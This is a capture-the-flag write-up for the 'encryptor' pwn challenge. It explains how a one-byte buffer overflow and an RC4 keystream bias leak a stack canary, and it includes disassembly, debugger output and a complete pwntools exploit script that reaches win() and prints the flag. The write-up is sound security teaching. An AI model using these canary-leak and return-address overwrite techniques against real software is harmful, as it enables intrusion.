# Encryptor: canary leak by rc4 + ret2win

```
Team: coldboots (https://ctftime.org/team/144114/)
Author: @ciphr
Date: 11.11.2025
```


# TL;DR -- summary
1. **leak stack canary**: use a _overflow_ on the 240byte input buffer to set a 1byte offset to encrypt chosen plaintext in RC4 to leak the stack canary one byte at a time.
2. **ret2win**: use the hidden 1337 menu option to smash the stack with the leaked canary and jump to **win() <address>**


# Challenge
Remote running the binary. Goal is to call win() which reads flag.txt. We are given the binary, and it's compiled with symbols, and stack protecetion. Yay!

```
$ ./encryptor
Welcome to the EPT encryptor!
Please behave yourself, and remember to stay away from a certain function at 0x5880c82294f0!
1. Encrypt a message
2. Reset the key and encrypt again
3. Change offset
4. Exit
```

All batteries included:
```
$ checksec encryptor
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

# What is a stack canary?? --> stack smashing protection
Stack Canaries is a guard to prevent stack smashing. If you want to overflow the buffers to control the return address (RIP) a stack canary is a secret that prevents you from doing the classical textbook smashing. In 64bit the stack canary is a NULL byte + 7random bytes. It it is not feasible to bruteforce the 56bit canary (in most cases) as the search space is `2^56`.

The `__stack_chk_guard` is located at **FS:0x28** and populated with a random value before _main()_ is called.

When stack protection is enabled the compiler embeds code into a function's prolog (before the function code is executed) and epilog (before calling RET).
- prolog: load canary from **FS:0x28** and store it on the stack frame **before local variables is allocated**
- epilog: load canary from the stack frame and compare it with **FS:0x28**

If it has been tampered with you will get the deaded `*** stack smashing detected ***: terminated`. 

We see this in the ASM of e.g. *main()*:
```
   0x00000000000018b8 <+28>:    mov    rax,QWORD PTR fs:0x28                    # prolog
   0x00000000000018c1 <+37>:    mov    QWORD PTR [rbp-0x8],rax                  # canary(rbp-0x8) = FS:0x28

   ...

   0x0000000000001a8c <+496>:   mov    rdx,QWORD PTR [rbp-0x8]                  
   0x0000000000001a90 <+500>:   sub    rdx,QWORD PTR fs:0x28                    
   0x0000000000001a99 <+509>:   je     0x000000001aa0 <main+516>                
   0x0000000000001a9b <+511>:   call   0x000000001100 <__stack_chk_fail@plt>    # canary(rbp-0x8) == FS:0x28 ???
```

One way to beat this protection mechanism (given the security settings of this binary) is to leak the canary so we can write it back making the `rbp-0x8` stay the same.

# Stack overview
We see in the stack overview that the **canary is placed BETWEEN local variables and the return address**. Remember that when we overflow local variables (e.g. buf_in) we write "downwards" in this view;
```
[ ---64bit 8byte memory --]

[  buf_in[0..7]           ]  @rbp-240-0x10 = rbp-0x100
[  buf_in[8..16]          ]  @rbp-0xf8
..
[  buf_in[232..239]       ]  @rbp-0x18
[  1byte offset (+align)  ]  @rbp-0x10
[  stack canary (FS:0x28) ]  @rbp-0x8        <--- this is where your eyes should look: the infamous canary!
[  caller RBP             ]  @rbp
[  caller return address  ]  @rbp+8
..
```

Our goal is to smash the stack and get **main()'s RET** to load the given address of `win()` into RIP. We overflow:
- 240 byte buffer
- 1byte offset
- 7byte junk (not in use, and not allocated, if you look at the stack of your running binary in a debugger you will see preivous stack junk)
- `canary` !! must stay the same as **FS:0x28** or we hit `__stack_chk_fail@plt`
- old RBP (doesn't matter)
- return address = **win()**

Test payload should overflow your stack alike this; (see pwndbg output at the bottom)
```
AAAAAAAA   buf_in[0..7]
AAAAAAAA   buf_in[8..16]
..
AAAAAAAA   buf_in[232..239]
AAAAAAAA   1byte offset + junk
 CANARY    null prefixed 8byte canary
AAAAAAAA   old RBP
  RET      new return address => RIP = win()
```

To avoid hitting the stack guard we need to **leak the canary**:

# Leak canary from RC4 encryption
The menu allows us to encrypt a message, and encrypt again.

```
1. Encrypt a message
2. Reset the key and encrypt again
```

The difference between these two is that:
- (1) sets, and overflows the input buffer, then encrypt, then resetkey
- (2) only encrypt, then resetkey

Menu (2) is convenient, as we will see later - because we don't have to resend the whole **240+offset** ever time we need to encrypt. We can spam sending `2\n * 10000` to get a lot of ciphertexts back for the same plaintext.

Menu (1) has a buffer overflow. As we saw in the stack-overview above there is a single **1byte OFFSET**:
```
   0x0000000000001958 <+188>:   mov    rax,QWORD PTR [rip+0x26d1]        # 0x4030 <stdin@GLIBC_2.2.5>
   0x000000000000195f <+195>:   lea    rdx,[rbp-0x1f0]
   0x0000000000001966 <+202>:   lea    rcx,[rdx+0xf0]                   
   0x000000000000196d <+209>:   mov    rdx,rax                           # stdin
   0x0000000000001970 <+212>:   mov    esi,0xf2                          # length = 0xf2 = 242
   0x0000000000001975 <+217>:   mov    rdi,rcx                           # buf_in[240]
   0x0000000000001978 <+220>:   call   0x1120 <fgets@plt>                # fgets(buf_in[240], 242, stdin)
```

A recap of Linux order of arguments in a function: **rdi rsi rdx rcx ..**.

We see that the vulnerable **fgets** is called as `fgets(buf_in[240], 242, stdin)` and reads from _stdin_ until it encounters a _newline_. The extra byte will go into the `1byte offset` as we saw in the stack overview.

Let's look at how RC4 is called:
```
   0x000000000000197d <+225>:   movzx  eax,BYTE PTR [rbp-0x10]  # 1byte offset
   0x0000000000001981 <+229>:   movzx  eax,al
   0x0000000000001984 <+232>:   lea    rdx,[rbp-0x1f0]
   0x000000000000198b <+239>:   add    rdx,0xf0
   0x0000000000001992 <+246>:   lea    rcx,[rdx+rax*1]          # rcx = buf_in + offset
   0x0000000000001996 <+250>:   lea    rax,[rbp-0x1f0]
   0x000000000000199d <+257>:   mov    rdx,rax                  # rdx = buf_out
   0x00000000000019a0 <+260>:   mov    rsi,rcx                  # rsi = buf_in + offset
   0x00000000000019a3 <+263>:   lea    rax,[rip+0x2696]
   0x00000000000019aa <+270>:   mov    rdi,rax                  # rdi = <key>
   0x00000000000019ad <+273>:   call   0x146d <RC4>
   0x00000000000019b2 <+278>:   lea    rax,[rbp-0x1f0]
   0x00000000000019b9 <+285>:   mov    rdi,rax
   0x00000000000019bc <+288>:   call   0x1788 <puts_hex>
   0x00000000000019c1 <+293>:   mov    eax,0x0
   0x00000000000019c6 <+298>:   call   0x16bc <resetKey>
   0x00000000000019cb <+303>:   jmp    0x1a87 <main+491>
```

RC4 is run as `RC4(key, (length)buf_in+offset, buf_out, buf_in+offset)`. After each encryption `resetKey` is called which randomized the key. It is a 100% normal RC4 implementation, nothing fishy about the RC4 (except RC4 has flaws).

This means we can adjust the offset to control _which_ memory segment RC4 encrypts. If we send **AAA..A\x00** we get back RC4 encrypted `AAAA...` which isnt very useful. 

From the stack overview we see that the first byte of the canary is `+248` bytes from the start of **buf_in**. This is within the range of our **1byte offset**. If we send **AAA..A\xF8** we get load RC4 with plaintext = `<canary><old rbp><rip>...` which is **VERY** useful!

This is a _chosen-plaintext attack_, as we control the _input_ to the encryption process.

`But what about the key?` First, let's understand the vulnerability.

# RC4 leaking plaintext from keystream biased byte[1]
RC4 is a simple XOR machine. It creates a _keystream_ from a given _key_ and then XOR each **keystream[i]** with the corresponding **plaintext[i]** to produce the _ciphertext_:

```
ciphertext = KS(key) ^ plaintext

ciphertext[0] = KS(key)[0] ^ plaintext[0]
ciphertext[1] = KS(key)[1] ^ plaintext[1]
ciphertext[2] = KS(key)[2] ^ plaintext[2]
..
etc
```

A known flaw in RC4 is that the second byte of the _keystream_ byte as a 1/128 chance of being zero, istead of what it should be: 1/256. This is called a **bias** in cryptography, and can be exploited. Remember the **identity property of XOR** which states that `a xor 0x00 = a`. From the above equation, if **by chance keystream[1] = 0x00** we get the plaintext[1] returned!

```
ciphertext[0] = KS(key)[0] ^ plaintext[0]
ciphertext[1] = 0x00       ^ plaintext[1] = plaintext[1]      <-- this is what we hope for!
ciphertext[0] = KS(key)[0] ^ plaintext[0]
```

> `But what about the key?` Well, this flaw is regardless of which key that produce **keystream[1] == 0x00**. So the key can be anything, we don't need it.

# The attack

> **An important part** here is that the byte we want to leak must be placed as the `second byte in the plaintext`, thus we must **adjust the offset by -1**. E.g. to leak **canary[0] at 0xf8** (we know this is a NULL byte) we must send **offset=0xf8-1=0xf7** so RC4 encrypts `<1byte><canary[0]><canary[1]>...`.

We detect the bias by statistics, and must send a fair amount of requests for the probability of the bias to hold. Without further calulations on exactly how many requests we need I figured **a good 10 000 requests** _per canary byte_ should hold :) 

The algorithm is easy, **for each canary[x] do**
- use menu(1) to place **canary[x] into plaintext[1]**
- spam menu(2) 10 000 times and collect the output **ciphertext[1]**
- the most frequency `ciphertext[1] == plaintext[1] == canary[x]`

> We don't need to _leak canary[0]_ but I do it to know everything is working with a python assertion. Easy to pebkac something in the code.

# ret2win
Payload = `A*248 + <leaked canary> + <super important hacker 8byte hex> + <win address>`


# Solve script
```python
from pwn import *

io = process("./encryptor") if args.LOCAL else remote("encryptor-pwn.ept.gg", 1337, ssl=True)

def leak_byte_at(offset):
    io.sendlineafter(b"4. Exit", b"1\n" + b"A" * 240 + p8(offset - 1)) # place canary[x] as plaintext[1]
    logger = log.progress(f"☠ leak canary @{offset})")
    io.send(b"2\n"*10000)
    pt_1 = [int(io.recvline_contains(b"Encrypted:").split(b" ")[2][2:4],16) for _ in range(10000)]
    canary_i = max(pt_1,key=pt_1.count) # find ciphertext[1] with highest occurance == canary[x]
    logger.status(format(canary_i, "02x"))
    return canary_i

io.recvuntil(b"function at 0x")
ret = int(io.recvuntil(b"!")[:-1], 16)
print("[@] ret=", hex(ret))

canary = bytes([leak_byte_at(i) for i in range(248 , 248 + 8)])
assert canary[0] == 0x00 # canary[0] is always NULL
print("[@] canary=", canary.hex())

io.sendline(b"1337")
io.sendline(b"A" * 248 + canary + b"B" * 8 + p64(ret))
io.sendline(b"4")
io.recvuntil(b"Enter feedback:\n>")
print(io.recvall())

"""
└─$ python3 solve.py
[+] Opening connection to encryptor-pwn.ept.gg on port 1337: Done
[@] ret= 0x55e782eca4f0
[O] ☠ leak canary @248): 00
[°] ☠ leak canary @249): 89
[▗] ☠ leak canary @250): e1
[O] ☠ leak canary @251): 5a
[▇] ☠ leak canary @252): 35
[▖] ☠ leak canary @253): d2
[o] ☠ leak canary @254): 71
[p] ☠ leak canary @255): 0d
[@] canary= 0089e15a35d2710d
[+] Receiving all data: Done (56B)
[*] Closed connection to encryptor-pwn.ept.gg port 1337
b' EPT{Bi4s_3r_eN_BaJ4s_06f51bdf804d6686e43381941d3ef435}\n'
"""
```

# Protip of the day:
If you are to send alot of input try doing it in larger batches, and not one-by-one. You spend alot of time waiting for the response for each requesy, ofc **if this is possible**.

Instead of this;
```
for _ in range(10000):
    io.sendline(b"2")
    io.recvuintil(b"something") # and do magic
```

Do this:
```
io.send(b"2\n"*10000)
for _ in range(10000):
    io.recvuintil(b"something") # and do magic
```

It's _much_ faster!


# Some pwndbg output

Sending `1377\nA*240 B*8 C*8 D*8 E*8\n`

```
pwndbg ./encryptor
pwndbg> break *(main + 466)
Breakpoint 1 at 0x1a6e
pwndbg> r
..
Welcome to the EPT encryptor!
Please behave yourself, and remember to stay away from a certain function at 0x5555555554f0!
1. Encrypt a message                       
2. Reset the key and encrypt again         
3. Change offset                           
4. Exit                                    
> 1337                                     
Leaving already? Enter feedback:           
> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEE

pwndbg> x/32bx $rbp-0x10
0x7fffffffb1f0: 0x42    0x42    0x42    0x42    0x42    0x42    0x42    0x42   <- 1byte offset + junk
0x7fffffffb1f8: 0x43    0x43    0x43    0x43    0x43    0x43    0x43    0x43   <- canary
0x7fffffffb200: 0x44    0x44    0x44    0x44    0x44    0x44    0x44    0x44   <- old RBP
0x7fffffffb208: 0x45    0x45    0x45    0x45    0x45    0x45    0x45    0x45   <- return address
```
